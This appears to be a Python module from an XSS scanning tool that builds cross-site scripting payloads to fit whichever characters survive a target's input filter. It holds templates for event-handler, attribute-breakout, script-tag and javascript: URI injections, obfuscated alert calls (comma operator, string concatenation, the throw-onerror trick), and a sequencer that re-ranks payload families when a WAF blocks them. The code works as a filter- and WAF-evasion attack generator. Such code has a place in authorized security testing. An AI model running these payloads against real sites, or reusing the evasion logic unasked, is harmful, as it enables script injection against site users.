"""
payloads/smart_generator.py

SmartGenerator — CharacterMatrix-aware payload generator.

This is the revolutionary part:
Instead of "spray and pray" with 500 payloads,
SmartGenerator KNOWS which characters survive the filter
and builds payloads GUARANTEED to only use surviving chars.

Pipeline:
  1. Receive CharacterMatrix from FilterProbe
  2. Build payload templates using only surviving chars
  3. Fill templates with context-appropriate execution methods
  4. Score each payload (SmartPayloadFilter)
  5. Return ranked list — highest probability first
"""

import base64
import random
from typing import List, Tuple, Optional

from utils.config import Context
from scanner.filter_probe import CharacterMatrix, SmartPayloadFilter


# ─── Execution method registry ───────────────────────────────────────────────

# Each method: (template, required_labels, description)
EXEC_METHODS = [
    # Direct alert variants
    ("alert(1)",          ["paren_open", "paren_close", "alert_keyword"], "direct_call"),
    ("alert`1`",          ["backtick",   "alert_keyword"],                "template_literal"),
    ("confirm(1)",        ["paren_open", "paren_close"],                  "confirm_call"),
    ("prompt(1)",         ["paren_open", "paren_close"],                  "prompt_call"),
    # Obfuscated
    ("(0,alert)(1)",      ["paren_open", "paren_close"],                  "comma_operator"),
    ("window.alert(1)",   ["paren_open", "paren_close"],                  "window_dot"),
    ("[1].find(alert)",   ["paren_open", "paren_close"],                  "array_find"),
    # String split obfuscation
    ("window['al'+'ert'](1)", ["paren_open", "single_quote"],            "str_concat"),
    # No-paren variants (for when parens are filtered)
    ("throw onerror=alert,1",  ["alert_keyword"],                         "throw_trick"),
    ("{onerror=alert}throw 1", ["alert_keyword"],                         "block_throw"),
]

# Payload blueprints per context × exec method × char survival
BLUEPRINTS = {
    Context.HTML: [
        # tag_open required
        ("<{tag} {event}={exec}>",          ["tag_open", "tag_close", "event_handler"]),
        ("<{tag}/{event}={exec}>",           ["tag_open", "tag_close", "event_handler"]),
        ("<{tag} src=x {event}={exec}>",     ["tag_open", "tag_close", "event_handler"]),
        ("<script>{exec}</script>",          ["tag_open", "tag_close", "script_keyword"]),
        ("<{tag} onload={exec}>",            ["tag_open", "tag_close", "onload"]),
        # No angle bracket fallbacks
        ("javascript:{exec}",               ["js_proto"]),
    ],
    Context.ATTRIBUTE: [
        ("\"{event}={exec} a=\"",            ["double_quote", "event_handler"]),
        ("'{event}={exec} a='",             ["single_quote",  "event_handler"]),
        ("\"><{tag} {event}={exec}>",        ["double_quote", "tag_open", "event_handler"]),
        ("'><{tag} {event}={exec}>",         ["single_quote", "tag_open", "event_handler"]),
        ("\" autofocus {event}={exec} \"",   ["double_quote", "event_handler"]),
        ("javascript:{exec}",               ["js_proto"]),
    ],
    Context.JS: [
        (";{exec}//",                        ["semicolon"]),
        ("';{exec}//",                       ["single_quote", "semicolon"]),
        ("\";{exec}//",                      ["double_quote", "semicolon"]),
        ("</script><script>{exec}</script>", ["tag_open", "script_keyword"]),
        ("\n{exec}\n",                       []),
        ("\\';{exec}//",                     ["backslash", "single_quote"]),
    ],
    Context.JS_STRING: [
        ("';{exec}//",                       ["single_quote", "semicolon"]),
        ("'+{exec}+'",                       ["single_quote"]),
        ("\";{exec}//",                      ["double_quote", "semicolon"]),
        ("\"+{exec}+\"",                     ["double_quote"]),
    ],
    Context.JS_TEMPLATE: [
        ("${{{exec}}}",                      ["backtick"]),
        ("`+{exec}+`",                       ["backtick"]),
    ],
    Context.URL: [
        ("javascript:{exec}",               ["js_proto"]),
        ("data:text/html,<script>{exec}</script>", ["tag_open", "script_keyword"]),
    ],
}

# Tags and events that work in HTML context
INJECTABLE_TAGS = ["img", "svg", "video", "audio", "details", "marquee", "input", "iframe"]
INJECTABLE_EVENTS = ["onerror", "onload", "onfocus", "ontoggle", "onstart", "onmouseover"]


class SmartGenerator:
    """
    CharacterMatrix-aware payload generator.

    For each context:
    1. Pick blueprints whose required chars all survive
    2. Fill blueprint with best available execution method
    3. Score against matrix → sort descending
    4. Return top N payloads with 100% survival guarantee
    """

    def __init__(self, max_payloads: int = 50):
        self.max     = max_payloads
        self._filter = SmartPayloadFilter()

    def generate(
        self,
        matrix: CharacterMatrix,
        context: str,
        include_fallbacks: bool = True,
    ) -> List[Tuple[str, str, float]]:
        """
        Returns list of (payload, method_label, score) sorted by score desc.
        All returned payloads only use characters confirmed to survive.
        """
        results = []

        blueprints = BLUEPRINTS.get(context, BLUEPRINTS[Context.HTML])
        # Also include UNKNOWN / polyglot blueprints
        if context == Context.UNKNOWN:
            blueprints = []
            for ctx_bps in BLUEPRINTS.values():
                blueprints.extend(ctx_bps)

        for template, required_labels in blueprints:
            # Check if all required chars survived
            if not all(matrix.can_use(r) for r in required_labels):
                continue

            # Fill template with each viable exec method
            for exec_str, exec_required, exec_label in EXEC_METHODS:
                # Check exec method requirements too
                if not all(matrix.can_use(r) for r in exec_required):
                    continue

                filled = self._fill_template(template, exec_str, context)
                if filled:
                    score = self._filter._score_payload(filled, matrix)
                    if score > 0:
                        results.append((filled, exec_label, score))

        # Deduplicate
        seen = set()
        unique = []
        for payload, label, score in results:
            if payload not in seen:
                seen.add(payload)
                unique.append((payload, label, score))

        # Sort by score descending
        unique.sort(key=lambda x: x[2], reverse=True)

        # Optionally add fallback payloads (encoding-based, for chars that are encoded not stripped)
        if include_fallbacks:
            fallbacks = self._encoded_fallbacks(matrix, context)
            unique.extend(fallbacks)

        return unique[:self.max]

    def _fill_template(self, template: str, exec_str: str, context: str) -> Optional[str]:
        """Fill a blueprint template with tag, event, and exec method."""
        tag   = random.choice(INJECTABLE_TAGS)
        event = random.choice(INJECTABLE_EVENTS)
        try:
            return template.format(tag=tag, event=event, exec=exec_str)
        except (KeyError, IndexError):
            return None

    def _encoded_fallbacks(
        self,
        matrix: CharacterMatrix,
        context: str,
    ) -> List[Tuple[str, str, float]]:
        """
        For characters that are HTML-entity-encoded (not stripped),
        generate payloads that use the encoded form deliberately.
        """
        fallbacks = []

        # If < is encoded to &lt; but still functional in JS context
        if "tag_open" in matrix.encoded:
            encoding = matrix.encoded["tag_open"]
            if "&#" in encoding or "&lt;" in encoding:
                # Try HTML entity version
                p = f"&#60;script&#62;alert(1)&#60;/script&#62;"
                fallbacks.append((p, "html_entity_fallback", 0.4))

        # If quotes are encoded, try template literals
        if "single_quote" in matrix.encoded and matrix.can_use("backtick"):
            p = "<script>alert`1`</script>"
            fallbacks.append((p, "template_literal_fallback", 0.5))

        # If parens encoded but can use throw trick
        if "paren_open" in matrix.stripped and matrix.can_use("alert_keyword"):
            p = "<script>onerror=alert;throw 1</script>"
            fallbacks.append((p, "no_paren_throw", 0.6))

        return fallbacks


# ─── Adaptive Payload Sequencer ──────────────────────────────────────────────

class AdaptiveSequencer:
    """
    Dynamically re-order and select payloads during a scan
    based on real-time feedback.

    - If a payload gets reflected → prioritize similar payloads
    - If a payload gets blocked → deprioritize that family
    - Learns within a single scan session
    """

    def __init__(self):
        self._family_scores: dict = {}  # method_label → score adjustment
        self._blocked_patterns: set = set()

    def feedback(self, payload: str, label: str, result: Optional[dict]):
        """
        Provide feedback on a payload result.
        result=None means blocked/no reflection.
        result=dict means detected.

        Penalty is AGGRESSIVE: first block = -0.6 (immediate deprioritize).
        This matches real-world behavior where WAF blocks entire families.
        """
        if result is None:
            # Aggressive penalty — first block drops below most other families
            current = self._family_scores.get(label, 0)
            # First block: -0.6, subsequent blocks: -0.2 each (diminishing)
            penalty = -0.6 if current >= 0 else -0.2
            self._family_scores[label] = current + penalty
            # Remember blocked payload prefix for pattern matching
            if len(payload) > 5:
                self._blocked_patterns.add(payload[:12])
        else:
            # Boost this family proportional to confidence
            conf = result.get("confidence", 0.5)
            # Successful families get strong boost to rise above others
            self._family_scores[label] = self._family_scores.get(label, 0) + (conf * 1.5)

    def rerank(
        self,
        payloads: List[Tuple[str, str, float]],
    ) -> List[Tuple[str, str, float]]:
        """Re-rank payloads based on accumulated feedback."""
        def adjusted_score(item):
            payload, label, score = item
            # Check if similar to blocked patterns
            for pattern in self._blocked_patterns:
                if payload.startswith(pattern):
                    return -1.0
            adjustment = self._family_scores.get(label, 0)
            return score + adjustment

        return sorted(payloads, key=adjusted_score, reverse=True)
